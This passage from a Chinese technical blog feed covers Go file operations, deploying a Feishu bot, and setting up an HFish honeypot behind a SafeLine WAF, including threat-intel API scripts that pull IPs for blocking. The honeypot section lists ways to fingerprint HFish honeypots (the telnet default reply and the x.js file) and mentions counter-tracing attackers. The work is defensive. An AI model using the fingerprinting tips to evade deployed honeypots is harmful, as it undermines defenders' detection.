== io.EOF &#123;<br>   <span class="hljs-keyword">break</span><br>   &#125;  <br>&#125;<br> &#125;<br></code></pre></td></tr></table></figure><h1 id="4-判断是否为目录"><a href="#4-判断是否为目录" class="headerlink" title="4. 判断是否为目录"></a>4. 判断是否为目录</h1><p>要判断文件是否为目录，在获得<code>os.File</code>对象，可以调用该对象的<code>Stat</code>方法，该返回返回一个实现了<code>os.FileInfo</code>接口的对象：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> FileInfo <span class="hljs-keyword">interface</span> &#123;<br>Name() <span class="hljs-type">string</span> <span class="hljs-comment">// 文件的基本名称</span><br>Size() <span class="hljs-type">int64</span> <span class="hljs-comment">// 普通文件的字节长度；其他文件的系统相关长度</span><br>Mode() FileMode <span class="hljs-comment">// 文件模式位</span><br>ModTime() time.Time <span class="hljs-comment">// 修改时间</span><br>IsDir() <span class="hljs-type">bool</span> <span class="hljs-comment">// Mode().IsDir()的缩写</span><br>Sys() any <span class="hljs-comment">// 底层数据源（可以返回nil）</span><br>&#125;<br></code></pre></td></tr></table></figure><p>比如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br> <span class="hljs-string">&quot;fmt&quot;</span>  <br> <span class="hljs-string">&quot;os&quot;</span>  <br>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br> filePath := <span class="hljs-string">&quot;/path/to/file&quot;</span>  <br>  <br> <span class="hljs-comment">// 打开文件  </span><br> fileInfo, err := os.Stat(filePath)  <br> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br> fmt.Println(<span class="hljs-string">&quot;无法获取文件信息:&quot;</span>, err)  <br> <span class="hljs-keyword">return</span>  <br> &#125;  <br>  <br> <span class="hljs-comment">// 判断是否为目录  </span><br> <span class="hljs-keyword">if</span> fileInfo.IsDir() &#123;  <br> fmt.Println(<span class="hljs-string">&quot;文件是一个目录&quot;</span>)  <br> &#125; <span class="hljs-keyword">else</span> &#123;  <br> fmt.Println(<span class="hljs-string">&quot;文件不是一个目录&quot;</span>)  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h1 id="5-遍历目录"><a href="#5-遍历目录" class="headerlink" title="5. 遍历目录"></a>5. 遍历目录</h1><p>可以调用<code>os.ReadDir()</code>函数，该函数返回一个元素类型为<code>os.DirEntry</code>的切片:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f *File)</span></span> ReadDir(n <span class="hljs-type">int</span>) ([]DirEntry, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>os.DirEntry</code>是一个接口，其定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> DirEntry <span class="hljs-keyword">interface</span> &#123;<br>Name() <span class="hljs-type">string</span><br>IsDir() <span class="hljs-type">bool</span><br>Type() FileMode<br>Info() (FileInfo, <span class="hljs-type">error</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DirEntry</code>接口也有<code>IsDir()</code>方法，因为可以再往下遍历，下面是一个实现目录遍历的示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>base := <span class="hljs-string">&quot;./&quot;</span><br>IterateFolder(base)<br> &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IterateFolder</span><span class="hljs-params">(base <span class="hljs-type">string</span>)</span></span> &#123;<br>dirEntry, err := os.ReadDir(base)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br> &#125;<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> dirEntry &#123;<br><span class="hljs-keyword">if</span> v.IsDir() &#123;<br>IterateFolder(base + <span class="hljs-string">&quot;/&quot;</span> + v.Name())<br> &#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(v.Name())<br> &#125;<br> &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h1 id="6-修改文件名称"><a href="#6-修改文件名称" class="headerlink" title="6. 修改文件名称"></a>6. 修改文件名称</h1><p>修改文件名称用<code>os.Rename</code>函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">err := os.Rename(<span class="hljs-string">&quot;./demo1.txt&quot;</span>, <span class="hljs-string">&quot;./demo2.txt&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>os.Rename</code>函数也可以用于移动文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">err := os.Rename(<span class="hljs-string">&quot;./hello.txt&quot;</span>, <span class="hljs-string">&quot;./m/hello.txt&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="7-删除文件"><a href="#7-删除文件" class="headerlink" title="7. 删除文件"></a>7. 删除文件</h1><p>删除一个文件或者一个空目录，直接调用<code>os</code>包的<code>Remove()</code>函数即可：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">fileName := <span class="hljs-string">&quot;./1.txt&quot;</span><br>os.Remove(fileName)<br></code></pre></td></tr></table></figure><p>可以根据<code>error</code>的返回值是否为nil判断是否删除成功，比如我们删除一个不存在的文件或者删除一个非空的目录：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//m为当前目录下一个非空目录</span><br>err := os.Remove(<span class="hljs-string">&quot;./m&quot;</span>)<br>fmt.Println(err)<br></code></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">remove ./m: directory <span class="hljs-keyword">not</span> empty<br></code></pre></td></tr></table></figure><p>对于非空目录，如果要删除，可以用<code>os</code>包的<code>RemoveAll</code>函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">err := os.RemoveAll(<span class="hljs-string">&quot;./m&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://juejin.cn/post/7264781288275394572">https://juejin.cn/post/7264781288275394572</a></li><li><a href="https://juejin.cn/post/7260904509198762021?searchId=20230915030002D063C3D51EC1D87BE2B3#heading-0">https://juejin.cn/post/7260904509198762021?searchId=20230915030002D063C3D51EC1D87BE2B3#heading-0</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用Serverless部署基于 gin 的飞书机器人</title>
    <link href="/2023/09/05/%E7%94%A8Serverless%E9%83%A8%E7%BD%B2%E5%9F%BA%E4%BA%8E-gin-%E7%9A%84%E9%A3%9E%E4%B9%A6%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    <url>/2023/09/05/%E7%94%A8Serverless%E9%83%A8%E7%BD%B2%E5%9F%BA%E4%BA%8E-gin-%E7%9A%84%E9%A3%9E%E4%B9%A6%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="1-使用环境"><a href="#1-使用环境" class="headerlink" title="1. 使用环境"></a>1. 使用环境</h2><ul><li>Serverless 包管理平台： <a href="http://www.devsapp.cn/details.html?name=start-feishubot">http://www.devsapp.cn/details.html?name=start-feishubot</a></li><li>Github：<a href="https://github.com/Leizhenpeng/start-gin-feishubot">https://github.com/Leizhenpeng/start-gin-feishubot</a></li><li>阿里云云函数：<a href="https://common-buy.aliyun.com/package?planCode=package_freetierfc_cn">https://common-buy.aliyun.com/package?planCode=package_freetierfc_cn</a></li><li>飞书开放平台：<a href="https://open.feishu.cn/">https://open.feishu.cn/</a></li></ul><h2 id="2-部署方法"><a href="#2-部署方法" class="headerlink" title="2. 部署方法"></a>2. 部署方法</h2><p>访问 Serverless 包管理平台 或者 github</p><p>找到部署&amp;体验</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637912.png" alt="部署&amp;体验"></p><h3 id="2-1-通过Serverless-Devs-Cli-部署"><a href="#2-1-通过Serverless-Devs-Cli-部署" class="headerlink" title="2.1  通过Serverless Devs Cli 部署"></a>2.1  通过Serverless Devs Cli 部署</h3><p>参照</p><p><a href="https://docs.serverless-devs.com/serverless-devs/install">https://docs.serverless-devs.com/serverless-devs/install</a></p><p>如果安装成功可以看到相对应的版本信息</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637948.png" alt="安装Serverless Devs"></p><ul><li><p>初始化项目</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">s init <span class="hljs-literal">start</span>-feishubot -d feishubot<br></code></pre></td></tr></table></figure></li></ul><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637994.png" alt="初始化项目"></p><ul><li><p>进入项目，修改<a href="https://open.feishu.cn/app?lang=zh-CN">飞书机器人配置</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> feishubot/code &amp;&amp; vim feishu_config.yaml<br></code></pre></td></tr></table></figure></li></ul><p>将飞书开发平台中 App ID 和 App Secret 填入feishu_config.yaml</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637979.png" alt="凭证"></p><p>然后进入开发者配置-事件订阅；将Encrypt Key 和 Verification Token 也填入feishu_config.yaml</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637988.png" alt="事件订阅"></p><ul><li><p>项目部署发布：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">s deploy -y<br></code></pre></td></tr></table></figure><ul><li><p>如果出现以下超时错误， 在go env中设置GOPROXY为国内镜像,例如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">go <span class="hljs-built_in">env</span> -w GOPROXY=https://goproxy.cn,direct<br></code></pre></td></tr></table></figure><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637021.png" alt="超时错误"></p></li></ul><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637552.png" alt="无网络超时"></p></li><li><p>获取部署链接后，将<code>__PUBLIC_URL__/webhook/event</code>  domain 配置到飞书机器人事件订阅中，即可体验计算器机器人</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637606.png" alt="部署完成"></p></li></ul><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637664.png" alt="配置请求地址"></p><h2 id="3-飞书群聊上线机器人"><a href="#3-飞书群聊上线机器人" class="headerlink" title="3 飞书群聊上线机器人"></a>3 飞书群聊上线机器人</h2><h3 id="3-1-在飞书开放平台发布"><a href="#3-1-在飞书开放平台发布" class="headerlink" title="3.1   在飞书开放平台发布"></a>3.1   在飞书开放平台发布</h3><p>成功部署后，需要在飞书开放平台发布，以下是成功发布</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637722.png" alt="发布"></p><p>飞书开发小助手也会提示</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637764.png" alt="飞书开发小助手"></p><h3 id="3-2-设置群聊机器人"><a href="#3-2-设置群聊机器人" class="headerlink" title="3.2 设置群聊机器人"></a>3.2 设置群聊机器人</h3><p>在群聊中添加机器人，选择已经发布的机器人</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637786.png" alt="选择机器人"></p><p>到这一步，机器人就创建完成</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309051637142.png" alt="机器人测试"></p>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>飞书 Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开源WAF与蜜罐的初尝试</title>
    <link href="/2023/08/29/%E5%BC%80%E6%BA%90WAF%E4%B8%8E%E8%9C%9C%E7%BD%90%E7%9A%84%E5%88%9D%E5%B0%9D%E8%AF%95/"/>
    <url>/2023/08/29/%E5%BC%80%E6%BA%90WAF%E4%B8%8E%E8%9C%9C%E7%BD%90%E7%9A%84%E5%88%9D%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h2><p>写好的两篇博客忘了备份，结果自己捣鼓来捣鼓去不小心删除掉了….而且我没有保留到回收站的习惯，所以找不回来了，于是重新写吧…..</p><p><strong>环境准备：</strong></p><ul><li>一台云主机</li><li>牧云主机管理助手（<a href="https://rivers.chaitin.cn/app/collie/home%EF%BC%89">https://rivers.chaitin.cn/app/collie/home）</a></li><li>长亭雷池WAF社区版 （<a href="https://waf-ce.chaitin.cn/%EF%BC%89">https://waf-ce.chaitin.cn/）</a></li><li>开源 HFish 蜜罐 （<a href="https://hfish.net/%EF%BC%89">https://hfish.net/）</a></li></ul><p>我的部署方式为 SaaS + docker ;  当然也可以用其他方式安装，可以查看官方链接使用相应部署方式</p><p>登录牧云主机管理助手（<a href="https://rivers.chaitin.cn/app/collie/home%EF%BC%89%EF%BC%8C%E7%BB%91%E5%AE%9A%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%90%8E%E8%BF%9B%E5%85%A5%E5%BA%94%E7%94%A8%E5%B8%82%E5%9C%BA">https://rivers.chaitin.cn/app/collie/home），绑定云主机后进入应用市场</a></p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/image-20230829132604152.png" alt="绑定云主机"></p><p>选择雷池社区版安装</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/image-20230829163030773.png" alt="选择雷池社区版"></p><p>根据指引成功安装好WAF，后台web界面如下</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308291654530.png" alt="雷池后台界面"></p><p>安装HFish蜜罐，参考链接 <a href="https://hfish.net/#/2-1-docker">https://hfish.net/#/2-1-docker</a></p><p>安装好后蜜罐web管理页面如下</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308291658603.png" alt="蜜罐web管理页面"></p><p>到这一步，SaaS + docker的WAF和蜜罐已经搭建好。</p><h2 id="2-如何让低交互蜜罐变得稍微高可信"><a href="#2-如何让低交互蜜罐变得稍微高可信" class="headerlink" title="2. 如何让低交互蜜罐变得稍微高可信"></a>2. 如何让低交互蜜罐变得稍微高可信</h2><p>由于HFish的开源版本中蜜罐大多数都是低交互的，所以当把IP发给朋友的时候，朋友看到80端口为tomcat的时候，说了句：“这一眼看上去就是蜜罐”。 于是蜜罐 “出师未捷身先死”…. 因此需要将低交互蜜罐做的逼真点。</p><h3 id="2-1-蜜罐与WAF的配合"><a href="#2-1-蜜罐与WAF的配合" class="headerlink" title="2.1  蜜罐与WAF的配合"></a>2.1  蜜罐与WAF的配合</h3><h4 id="2-1-1-缩小蜜罐端口暴露面"><a href="#2-1-1-缩小蜜罐端口暴露面" class="headerlink" title="2.1.1 缩小蜜罐端口暴露面"></a>2.1.1 缩小蜜罐端口暴露面</h4><p>HFish有环境模板，尽可能的减少了端口的暴露，使其更像真实环境</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308291758985.png" alt="环境模板"></p><p>随意选择一个模板，在其模板的基础上进行调整。关闭了一些TCP常用端口，比如22、23、445、3389等</p><p>然后修改高交互Mysql蜜罐的端口，设置默认3306的话，遇到有经验的攻击者会被识别出为蜜罐。</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308291802617.png" alt="开放蜜罐端口"></p><h4 id="2-1-2-修改相应的特征"><a href="#2-1-2-修改相应的特征" class="headerlink" title="2.1.2 修改相应的特征"></a>2.1.2 修改相应的特征</h4><h5 id="2-1-2-1-修改telnet协议特征或者使用高交互的telnet蜜罐"><a href="#2-1-2-1-修改telnet协议特征或者使用高交互的telnet蜜罐" class="headerlink" title="2.1.2.1 修改telnet协议特征或者使用高交互的telnet蜜罐"></a>2.1.2.1 修改telnet协议特征或者使用高交互的telnet蜜罐</h5><p>Hfish 中的低交互telnet蜜罐，默认监听在23端口。模拟的该协议默认无需验证，并且对各个命令的结果都做了响应的模板来做应答。在命令为空或者直接回车换行时，会响应default模板，该模板内容为test。因此可以利用这个特征进行该蜜罐在telnet服务上的检测如图所示。</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309070001860.png" alt="telnet蜜罐"></p><p>解决办法：</p><ol><li><p>修改配置文件中的默认模版内容</p></li><li><p>更换为高交互telnet蜜罐</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309070005747.png" alt="切换高交互telnet蜜罐"></p></li></ol><h5 id="2-1-2-2-修改明显的web特征"><a href="#2-1-2-2-修改明显的web特征" class="headerlink" title="2.1.2.2 修改明显的web特征"></a>2.1.2.2 修改明显的web特征</h5><p>HFIsh在默认8080端口实现了一个WordPress登录页面，页面中由一个名为x.js的javascript文件用来记录尝试爆破的登录名密码。直接通过判断wordpress登录页是否存在x.js文件就可判断是否为蜜罐。</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309070008280.png" alt="HFish蜜罐"></p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309070007634.png" alt="x.js文件"></p><p>解决办法：</p><ol><li>修改x.js的命名和代码内容</li><li>关闭WordPress这个蜜罐，使用其他蜜罐</li></ol><h4 id="2-1-3-在部分web蜜罐上设置WAF防护"><a href="#2-1-3-在部分web蜜罐上设置WAF防护" class="headerlink" title="2.1.3 在部分web蜜罐上设置WAF防护"></a>2.1.3 在部分web蜜罐上设置WAF防护</h4><p>拿宝塔蜜罐和Zabbix监控蜜罐举例</p><p>现在宝塔蜜罐和Zabbix的蜜罐IP为 9224 和 9192</p><p>在雷池上设置对宝塔蜜罐和Zabbix蜜罐web页面的防护</p><p><strong>宝塔蜜罐页面的防护设置：</strong></p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308291811940.png" alt="宝塔蜜罐的防护"></p><p><strong>Zabbix蜜罐的防护设置：</strong></p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308291812001.png" alt="Zabbix页面的防护设置"></p><p>然后分别去访问相应的页面，如：https:&#x2F;&#x2F;&lt;你的域名&gt;:&lt;雷池监听端口&gt;</p><p>如果能正常访问，接着测试攻击发现被拦截，即表示两个蜜罐web站点已经被waf防护</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308291815819.png" alt="被waf防护的蜜罐web页面"></p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308291818157.png" alt="攻击测试发现被waf拦截"></p><p>并且蜜罐也成功检测到攻击：</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308291820693.png" alt="蜜罐告警"></p><p>这样的话，攻击者在访问IP的特定web页面的时候发现有WAF，或许在思考自己是否踩中蜜罐的情况下有所迟疑。</p><p><strong>另外</strong>： </p><p>在雷池WAF的 防护配置-语义分析中，可以加将 “机器人检测”设置为仅观察，如果策略太严，FOFA、zoomeye、quake等空间测绘的IP节点也会被WAF拦截，这样的话，蜜罐端口就少了一个暴露方向。</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309070112823.png" alt="机器人检测"></p><h2 id="3-从蜜罐上获取高价值IP"><a href="#3-从蜜罐上获取高价值IP" class="headerlink" title="3. 从蜜罐上获取高价值IP"></a>3. 从蜜罐上获取高价值IP</h2><p>思路如下</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308311848653.png" alt="获取思路"></p><h3 id="3-1-对踩中蜜罐的攻击IP进行整理分类"><a href="#3-1-对踩中蜜罐的攻击IP进行整理分类" class="headerlink" title="3.1 对踩中蜜罐的攻击IP进行整理分类"></a>3.1 对踩中蜜罐的攻击IP进行整理分类</h3><p><strong>注意：以下分类仅代表个人观点 ，如有异议，以你为准。</strong></p><ol><li><p>踩中蜜罐，并且IP的威胁情报为以下的，可直接在WAF侧进行拉黑封禁</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tex">Scanner-扫描<br>Botnet-僵尸网络<br>uspicious-可疑<br>Mobile-移动基站<br></code></pre></td></tr></table></figure></li><li><p>踩中蜜罐，并且IP的威胁情报为以下的，为高价值IP，可尝试进行反制溯源，需不需要放入WAF黑名单视情况（傀儡机通常会进行大量扫描，也可以拉黑）。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tex">Spam-垃圾邮件<br>Zombie-傀儡机<br>Exploit-漏洞利用<br>IDC-IDC服务器<br>Edu-教育<br>BTtracker-BT服务器<br>Backbone-骨干网 <br></code></pre></td></tr></table></figure></li></ol><p>可通过蜜罐的API直接调用，提前需要在 平台管理 -&gt;系统信息 处将 <strong>HFish社区云情报计划</strong> 勾上</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308302211406.png" alt="勾选社区云情报计划"></p><p>然后进入 平台管理 -&gt; 系统配置 -&gt; API配置选择已开放的API，根据使用示例中进行API调用</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308302214506.png" alt="API配置"></p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308302213010.png" alt="API的参数说明"></p><p>用于在WAF侧进行拉黑封禁的IP，其获取脚本可用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><br>url = <span class="hljs-string">&quot;https://Server_IP/api/v1/attack/ip?api_key=YOUR_API_KEY&quot;</span><br><br>payload = json.dumps(<br>    &#123;<br>        <span class="hljs-string">&quot;start_time&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;end_time&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;intranet&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;threat_label&quot;</span>: [<br>            <span class="hljs-string">&quot;Scanner&quot;</span>,<br>            <span class="hljs-string">&quot;Botnet&quot;</span>,<br>            <span class="hljs-string">&quot;uspicious&quot;</span>,<br>            <span class="hljs-string">&quot;Mobile&quot;</span>,<br>        ],<br>    &#125;<br>)<br>headers = &#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>&#125;<br><br>response = requests.request(<span class="hljs-string">&quot;POST&quot;</span>, url, headers=headers, data=payload, verify=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>获取高价值可溯源反制IP，API脚本可用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><br>url = <span class="hljs-string">&quot;https://Server_IP/api/v1/attack/ip?api_key=YOUR_API_KEY&quot;</span><br><br>payload = json.dumps(<br>    &#123;<br>        <span class="hljs-string">&quot;start_time&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;end_time&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;intranet&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;threat_label&quot;</span>: [<br>            <span class="hljs-string">&quot;IDC&quot;</span>,<br>            <span class="hljs-string">&quot;Spam&quot;</span>,<br>            <span class="hljs-string">&quot;Zombie&quot;</span>,<br>            <span class="hljs-string">&quot;Exploit&quot;</span>,<br>            <span class="hljs-string">&quot;Edu&quot;</span>,<br>            <span class="hljs-string">&quot;BTtracker&quot;</span>,<br>            <span class="hljs-string">&quot;Backbone&quot;</span>,<br>        ],<br>    &#125;<br>)<br>headers = &#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>&#125;<br><br>response = requests.request(<span class="hljs-string">&quot;POST&quot;</span>, url, headers=headers, data=payload, verify=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>后续会在对应的脚本上进行添加功能。</p><h3 id="3-2-将获取到的IP通过webhook形式发送到飞书"><a href="#3-2-将获取到的IP通过webhook形式发送到飞书" class="headerlink" title="3.2 将获取到的IP通过webhook形式发送到飞书"></a>3.2 将获取到的IP通过webhook形式发送到飞书</h3><p>根据之前的脚本进行添加调整，基本的demo已经弄好，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 